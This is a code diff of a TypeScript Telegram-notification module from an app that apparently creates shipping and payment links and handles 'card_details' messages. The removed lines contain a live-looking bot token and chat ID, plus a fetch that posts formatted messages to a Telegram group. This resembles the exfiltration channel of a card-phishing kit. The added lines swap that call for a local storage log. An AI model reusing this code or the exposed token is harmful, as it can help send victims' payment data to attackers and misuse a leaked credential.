@@ -1,22 +1,3 @@
-// Telegram Bot Integration
-const BOT_TOKEN = '8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0';
-
-// IMPORTANT: This must be a USER chat ID, NOT the bot ID (8208871147)
-// To get your chat ID:
-// 1. Start conversation with @khlijapp_bot
-// 2. Send any message to the bot
-// 3. Visit: https://api.telegram.org/bot8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0/getUpdates
-// 4. Look for "chat":{"id": in the response - that's your chat ID
-// 5. Or use the helper tool: open get-user-chat-id.html in your browser
-const CHAT_ID = '-1003209802920'; // Supergroup chat ID for Telegram notifications
-
-// Check if CHAT_ID is properly configured
-if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
-  console.warn('⚠️ Telegram CHAT_ID not configured properly!');
-  console.warn('Please update CHAT_ID in /src/lib/telegram.ts with your actual user chat ID');
-  console.warn('Use get-user-chat-id.html helper tool to get your chat ID');
-}
-
 export interface TelegramMessage {
   type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'test';
   data: Record<string, any>;
@@ -29,69 +10,79 @@ export interface TelegramResponse {
   error?: string;
 }
 
+interface TelegramLogEntry {
+  id: string;
+  createdAt: string;
+  message: TelegramMessage;
+  formatted: string;
+}
+
+const TELEGRAM_LOG_KEY = "gulf_unified_telegram_messages";
+const isBrowser = typeof window !== "undefined";
+
+const clone = <T>(value: T): T => JSON.parse(JSON.stringify(value));
+
+const readLog = (): TelegramLogEntry[] => {
+  if (isBrowser) {
+    try {
+      const raw = window.localStorage.getItem(TELEGRAM_LOG_KEY);
+      if (!raw) {
+        return [];
+      }
+      return JSON.parse(raw) as TelegramLogEntry[];
+    } catch (error) {
+      console.warn('Failed to read local Telegram log:', error);
+      return [];
+    }
+  }
+
+  return (globalThis as any).__telegramLog__ ? clone((globalThis as any).__telegramLog__) : [];
+};
+
+const writeLog = (entries: TelegramLogEntry[]) => {
+  const payload = JSON.stringify(entries);
+
+  if (isBrowser) {
+    try {
+      window.localStorage.setItem(TELEGRAM_LOG_KEY, payload);
+      return;
+    } catch (error) {
+      console.warn('Failed to persist Telegram log locally:', error);
+    }
+  }
+
+  (globalThis as any).__telegramLog__ = entries;
+};
+
+const generateId = () => {
+  if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
+    return crypto.randomUUID();
+  }
+  return `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 10)}`;
+};
+
 export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
   try {
-    // Check if CHAT_ID is properly configured
-    if (CHAT_ID === 'YOUR_USER_CHAT_ID_HERE' || CHAT_ID === '8208871147') {
-      const errorMsg = 'Telegram CHAT_ID not configured. Please update CHAT_ID in /src/lib/telegram.ts with your actual user chat ID. Use get-user-chat-id.html helper tool to get your chat ID.';
-      console.error('❌', errorMsg);
-      return {
-        success: false,
-        error: errorMsg
-      };
-    }
+    const logEntries = readLog();
+    const formatted = formatTelegramMessage(message);
+    const entry: TelegramLogEntry = {
+      id: generateId(),
+      createdAt: new Date().toISOString(),
+      message: clone(message),
+      formatted,
+    };
 
-    const text = formatTelegramMessage(message);
-    
-    console.log('Sending to Telegram:', { chatId: CHAT_ID, message: text });
-    
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: text,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true
-      })
-    });
+    logEntries.push(entry);
+    writeLog(logEntries);
 
-    const responseData = await response.json();
-    
-    if (!response.ok) {
-      console.error('Telegram API error:', responseData);
-      
-      // Provide specific error messages for common issues
-      let errorMessage = responseData.description || 'Unknown error';
-      
-      if (responseData.error_code === 403) {
-        if (responseData.description?.includes("bots can't send messages to bots")) {
-          errorMessage = 'خطأ: لا يمكن للبوت إرسال رسائل للبوت نفسه. يرجى تحديث CHAT_ID بمعرف المستخدم الصحيح. استخدم get-user-chat-id.html للحصول على معرف المحادثة الصحيح.';
-        } else if (responseData.description?.includes("Forbidden")) {
-          errorMessage = 'خطأ: محظور. تأكد من بدء محادثة مع البوت أولاً.';
-        }
-      } else if (responseData.error_code === 400) {
-        if (responseData.description?.includes("chat not found")) {
-          errorMessage = 'خطأ: لم يتم العثور على المحادثة. تأكد من صحة معرف المحادثة.';
-        }
-      }
-      
-      return {
-        success: false,
-        error: errorMessage
-      };
-    }
+    console.info("[Telegram sandbox] رسالة محفوظة محلياً:", entry);
 
-    console.log('✅ Telegram message sent successfully:', responseData);
-    
     return {
       success: true,
-      messageId: responseData.result?.message_id?.toString()
+      messageId: entry.id,
     };
   } catch (error) {
-    console.error('Error sending to Telegram:', error);
+    console.error('Error storing Telegram message locally:', error);
     return {
       success: false,
       error: error instanceof Error ? error.message : 'Unknown error'
